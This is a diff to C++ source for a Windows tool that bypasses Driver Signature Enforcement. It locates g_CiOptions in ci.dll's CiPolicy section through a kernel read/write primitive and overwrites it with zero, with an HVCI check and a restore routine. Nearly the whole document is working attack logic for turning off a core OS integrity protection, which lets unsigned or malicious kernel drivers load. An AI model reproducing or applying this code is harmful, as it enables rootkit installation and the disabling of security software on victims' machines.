@@ -3,7 +3,7 @@
 
 #pragma comment(lib, "ntdll.lib")
 
-// Kernel module structures (same as in Utils.cpp)
+// Kernel module structures
 typedef struct _SYSTEM_MODULE {
     ULONG_PTR Reserved1;
     ULONG_PTR Reserved2;
@@ -45,51 +45,51 @@ bool DSEBypass::DisableDSE() noexcept {
     
     DEBUG(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
     
-    // Step 3: Read current value and store as original
+    // Step 3: Read current value
     auto current = m_rtc->Read32(m_ciOptionsAddr);
     if (!current) {
         ERROR(L"[DSE] Failed to read g_CiOptions");
         return false;
     }
     
-    m_originalValue = current.value();
-    DEBUG(L"[DSE] Original g_CiOptions: 0x%08X", m_originalValue);
+    DWORD currentValue = current.value();
+    m_originalValue = currentValue;
+    DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
     
-    // Step 4: Test write capability - write same value back
-    DEBUG(L"[DSE] Testing write capability before modification...");
-    if (!m_rtc->Write32(m_ciOptionsAddr, m_originalValue)) {
-        ERROR(L"[DSE] Memory test write failed - address may be read-only or protected");
-        ERROR(L"[DSE] This could indicate Tamper Protection or PatchGuard monitoring");
+    // Step 4: Check for ANY HVCI/VBS protection bits
+    if (currentValue & 0x0001C000) {
+        ERROR(L"[!] Cannot proceed: g_CiOptions = 0x%08X (HVCI flags: 0x%05X)", 
+              currentValue, (currentValue & 0x0001C000));
+        ERROR(L"[!] System uses VBS with hypervisor protection (Ring -1 below kernel)");
+        ERROR(L"[!] Memory integrity enforced at hardware virtualization level");
+        ERROR(L"[!] DSE bypass impossible - disable VBS in BIOS/Windows Security");
         return false;
     }
     
-    // Verify test write
-    auto testRead = m_rtc->Read32(m_ciOptionsAddr);
-    if (!testRead || testRead.value() != m_originalValue) {
-        ERROR(L"[DSE] Memory test verification failed (expected: 0x%08X, got: 0x%08X)", 
-              m_originalValue, testRead ? testRead.value() : 0xFFFFFFFF);
-        ERROR(L"[DSE] Memory region appears to be protected or monitored");
+    // Step 5: Verify we have patchable DSE (0x00000006)
+    if (currentValue != 0x00000006) {
+        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000006)", currentValue);
+        ERROR(L"[DSE] DSE may already be disabled or system configuration unsupported");
         return false;
     }
     
-    DEBUG(L"[DSE] Write capability test passed - memory is writable");
-    
-    // Step 5: Disable DSE by clearing ONLY DSE bits (preserve ALL other flags)
-    DWORD newValue = m_originalValue & ~0x6;  // Clear bit 1 and 2 (DSE), keep rest
+    // Step 6: Disable DSE by clearing bits 1 and 2
+    DWORD newValue = 0x00000000;
     
     if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
         ERROR(L"[DSE] Failed to write g_CiOptions");
         return false;
     }
     
-    // Step 6: Verify the actual change
+    // Step 7: Verify the change
     auto verify = m_rtc->Read32(m_ciOptionsAddr);
     if (!verify || verify.value() != newValue) {
-        ERROR(L"[DSE] Verification failed (read back: 0x%08X)", verify ? verify.value() : 0xFFFFFFFF);
+        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
+              newValue, verify ? verify.value() : 0xFFFFFFFF);
         return false;
     }
     
-    SUCCESS(L"[DSE] DSE disabled successfully! (0x%08X -> 0x%08X)", m_originalValue, newValue);
+    SUCCESS(L"[DSE] DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
     return true;
 }
 
@@ -122,31 +122,15 @@ bool DSEBypass::RestoreDSE() noexcept {
     DWORD currentValue = current.value();
     DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
     
-    // Step 4: Test write capability before modification
-    DEBUG(L"[DSE] Testing write capability before restoration...");
-    if (!m_rtc->Write32(m_ciOptionsAddr, currentValue)) {
-        ERROR(L"[DSE] Memory test write failed - address may be read-only or protected");
+    // Step 4: Verify DSE is disabled (0x00000000)
+    if (currentValue != 0x00000000) {
+        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000000)", currentValue);
+        ERROR(L"[DSE] DSE may already be enabled or system configuration unsupported");
         return false;
     }
     
-    auto testRead = m_rtc->Read32(m_ciOptionsAddr);
-    if (!testRead || testRead.value() != currentValue) {
-        ERROR(L"[DSE] Memory test verification failed");
-        return false;
-    }
-    
-    DEBUG(L"[DSE] Write capability test passed");
-    
-    // Step 5: Restore DSE bits (preserve HVCI/security flags if present)
-    DWORD newValue;
-    
-    if (m_originalValue) {
-        // We have stored original value from disable - use it
-        newValue = m_originalValue;
-    } else {
-        // No stored original - restore DSE bits while preserving security flags
-        newValue = currentValue | 0x6;  // Set DSE bits, keep upper bits intact
-    }
+    // Step 5: Restore DSE bits
+    DWORD newValue = 0x00000006;
     
     if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
         ERROR(L"[DSE] Failed to write g_CiOptions");
@@ -156,7 +140,8 @@ bool DSEBypass::RestoreDSE() noexcept {
     // Step 6: Verify the change
     auto verify = m_rtc->Read32(m_ciOptionsAddr);
     if (!verify || verify.value() != newValue) {
-        ERROR(L"[DSE] Verification failed");
+        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
+              newValue, verify ? verify.value() : 0xFFFFFFFF);
         return false;
     }
     
@@ -216,20 +201,6 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
         return std::nullopt;
     }
 
-    INFO(L"[DSE] Found %d kernel modules", modules->Count);
-    
-    // Debug: Show first 10 modules for diagnostic purposes
-    DEBUG(L"[DSE] Listing first 10 kernel modules:");
-    for (ULONG i = 0; i < modules->Count && i < 10; i++) {
-        auto& mod = modules->Modules[i];
-        const char* fileName = strrchr(mod.ImageName, '\\');
-        if (fileName) fileName++;
-        else fileName = mod.ImageName;
-        
-        DEBUG(L"[DSE]   Module %d: %S at 0x%llX", i, fileName, 
-              reinterpret_cast<ULONG_PTR>(mod.ImageBase));
-    }
-    
     // Search for target module by name
     for (ULONG i = 0; i < modules->Count; i++) {
         auto& mod = modules->Modules[i];
@@ -245,10 +216,9 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
         if (_stricmp(fileName, moduleName) == 0) {
             ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
             
-            // Validate base address is not NULL
             if (baseAddr == 0) {
                 ERROR(L"[DSE] Module %S found but ImageBase is NULL", moduleName);
-                continue; // Keep searching in case of duplicates
+                continue;
             }
             
             DEBUG(L"[DSE] Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
@@ -276,7 +246,6 @@ ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
     DEBUG(L"[DSE] CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
     
     // g_CiOptions is always at offset +4 in CiPolicy section
-    // This is a documented offset used by all DSE bypass tools
     ULONG_PTR ciOptionsAddr = dataStart + 0x4;
     
     // Verify we can read from this address
@@ -324,7 +293,7 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
     
     DEBUG(L"[DSE] Scanning %d sections for CiPolicy...", numSections.value());
     
-    // ZOPTYMALIZOWANE: Szukaj tylko CiPolicy bez wypisywania wszystkich
+    // Search for CiPolicy section
     for (WORD i = 0; i < numSections.value(); i++) {
         ULONG_PTR sectionHeader = firstSection + (i * 40);
         
@@ -354,25 +323,4 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
     
     ERROR(L"[DSE] CiPolicy section not found in ci.dll");
     return std::nullopt;
-}
-
-bool DSEBypass::IsValidDataPointer(ULONG_PTR moduleBase, ULONG_PTR addr) noexcept {
-    // Simplified validation - address should be within module bounds
-    // Maximum reasonable module size is 2MB
-    return (addr > moduleBase && addr < moduleBase + 0x200000);
-}
-
-DWORD DSEBypass::GetWindowsBuild() noexcept {
-    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
-    
-    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(
-        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
-    
-    if (RtlGetVersion) {
-        RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
-        return osInfo.dwBuildNumber;
-    }
-    
-    return 0;
 }
